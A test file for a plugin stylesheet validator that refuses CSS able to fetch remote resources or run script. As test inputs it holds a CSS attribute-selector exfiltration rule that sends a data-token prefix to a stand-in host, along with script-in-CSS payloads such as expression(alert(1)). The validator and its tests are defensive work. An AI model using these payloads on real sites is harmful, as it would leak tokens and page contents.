import { describe, expect, it } from 'vitest'
import { checkPluginStylesheet, MAX_PLUGIN_STYLESHEET_BYTES } from '../src/styles.js'

/**
 * L32 — what a plugin's stylesheet may contain, and why. The rules are narrow
 * on purpose: a stylesheet served from the site's own origin that could fetch
 * anything could report what a page holds.
 */

describe('a plugin’s stylesheet', () => {
  it('accepts ordinary CSS, including an inline image', () => {
    expect(
      checkPluginStylesheet('.cg-callout { color: var(--cg-color-accent, currentColor); }').ok,
    ).toBe(true)
    expect(
      checkPluginStylesheet('.cg-icon { background: url("data:image/svg+xml;base64,PHN2Zy8+"); }')
        .ok,
    ).toBe(true)
  })

  it('refuses a stylesheet that would fetch anything at all', () => {
    expect(checkPluginStylesheet('@import url("https://elsewhere.example/x.css");').ok).toBe(false)
    // The shape that turns CSS into an exfiltration channel.
    expect(
      checkPluginStylesheet(
        '.cg-x[data-token^="a"] { background: url(https://elsewhere.example/a.gif); }',
      ).ok,
    ).toBe(false)
    // Even a same-site URL: this host did not read what is at the other end.
    expect(checkPluginStylesheet('.cg-x { background: url(/uploads/a.png); }').ok).toBe(false)
  })

  it('refuses script under another name, and markup', () => {
    expect(checkPluginStylesheet('.cg-x { width: expression(alert(1)); }').ok).toBe(false)
    expect(checkPluginStylesheet('.cg-x { behavior: url(#default#time2); }').ok).toBe(false)
    expect(checkPluginStylesheet('.cg-x { background: javascript:alert(1); }').ok).toBe(false)
    expect(checkPluginStylesheet('<style>.cg-x { color: red }</style>').ok).toBe(false)
  })

  it('does not refuse a stylesheet for documenting the rules it follows', () => {
    // Found by this project's own example, which was refused for explaining
    // in a comment that it uses no `@import`.
    const css = `/* No @import here, and no url() that is not an inline image. */\n.cg-x { color: red }`

    expect(checkPluginStylesheet(css).ok).toBe(true)
  })

  it('refuses one too large to be a stylesheet', () => {
    const huge = `.cg-x { color: red }\n`.repeat(MAX_PLUGIN_STYLESHEET_BYTES)

    expect(checkPluginStylesheet(huge)).toMatchObject({ ok: false })
  })
})
